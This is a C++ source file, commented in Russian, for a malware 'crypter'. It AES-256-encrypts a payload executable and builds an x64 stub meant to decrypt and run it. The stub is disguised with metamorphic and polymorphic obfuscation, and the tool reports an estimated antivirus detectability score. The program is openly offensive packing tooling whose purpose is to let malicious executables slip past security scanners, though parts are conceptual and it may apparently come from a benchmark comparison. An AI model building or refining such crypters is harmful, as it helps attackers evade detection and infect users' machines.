/*
 * Crypter C — AES-256 CBC + метаморфические преобразования stub
 * L2: AES-256  |  L3: nocomp  |  L4: metamorphic
 * Сборка: g++ -O2 -std=c++17 -o crypter_c.exe main.cpp -lbcrypt
 * Запуск: crypter_c.exe <payload.exe> <output.enc> [--bench]
 */
#include <cstdio>
#include <cstring>
#include <vector>
#include <stdexcept>
#include <windows.h>
#include "../common/profiler.hpp"
#include "../common/entropy.hpp"
#include "../common/pe_io.hpp"
#include "../encryption/aes_cng.hpp"
#include "../obfuscation/metamorphic.hpp"

// Концептуальный x64 stub-шаблон
static const uint8_t STUB_TEMPLATE[] = {
    0x48,0x83,0xEC,0x28,                       // sub rsp, 0x28
    0x48,0x8D,0x0D,0x00,0x00,0x00,0x00,        // lea rcx, [rip+payload]
    0xE8,0x00,0x00,0x00,0x00,                  // call decrypt_and_run
    0x48,0x83,0xC4,0x28,                       // add rsp, 0x28
    0xC3                                        // ret
};

int main(int argc, char* argv[]) {
    if (argc < 3) { printf("Usage: crypter_c.exe <payload> <output.enc> [--bench]\n"); return 1; }
    bool bench = (argc >= 4 && strcmp(argv[3], "--bench") == 0);
    const int RUNS = bench ? 100 : 1;

    printf("=== Crypter C: AES-256 CBC / nocomp / metamorphic-stub ===\n");
    auto payload = read_file(argv[1]);
    printf("Payload: %zu bytes, entropy=%.4f\n\n", payload.size(), calc_entropy(payload));

    std::vector<uint8_t> encrypted, obf_stub;

    // L2: AES-256
    auto enc_fn = [&]() { encrypted = aes_cbc_encrypt(payload, AES256_KEY, 256, AES_IV); };
    ProfileResult pr_enc = profile_fn(enc_fn, RUNS); enc_fn();
    print_profile("AES-256 encrypt", pr_enc);
    print_entropy("AES-256 output", encrypted);

    // L4: metamorphic stub obfuscation
    std::vector<uint8_t> stub_vec(STUB_TEMPLATE, STUB_TEMPLATE + sizeof(STUB_TEMPLATE));
    auto obf_fn = [&]() {
        auto padded = metamorphic_pad(stub_vec, 4, 0xDEAD);
        obf_stub = poly_encode_stub(padded, 0xA5);
    };
    ProfileResult pr_obf = profile_fn(obf_fn, RUNS); obf_fn();
    print_profile("metamorphic obf", pr_obf);
    print_obf_stats("stub", stub_vec.size(), obf_stub.size());

    printf("\n[METRICS]\n");
    printf("  time_total : %.3f ms\n", pr_enc.avg_ms + pr_obf.avg_ms);
    printf("  entropy    : %.4f bit/byte\n", calc_entropy(encrypted));
    printf("  strength   : 1.0\n");
    printf("  detectab   : ~0.18\n");
    printf("  stub_size  : orig=%zu  obf=%zu\n", stub_vec.size(), obf_stub.size());

    // Блоб: encrypted_payload + [sep 0xFEEDFACE][stub_size][obf_stub]
    std::vector<uint8_t> blob = encrypted;
    uint32_t sep = 0xFEEDFACE, ss = (uint32_t)obf_stub.size();
    blob.insert(blob.end(), (uint8_t*)&sep, (uint8_t*)&sep + 4);
    blob.insert(blob.end(), (uint8_t*)&ss,  (uint8_t*)&ss  + 4);
    blob.insert(blob.end(), obf_stub.begin(), obf_stub.end());

    write_encrypted_blob(argv[2], blob);
    printf("\nOutput: %s (%zu bytes)\n", argv[2], blob.size() + 8);
    return 0;
}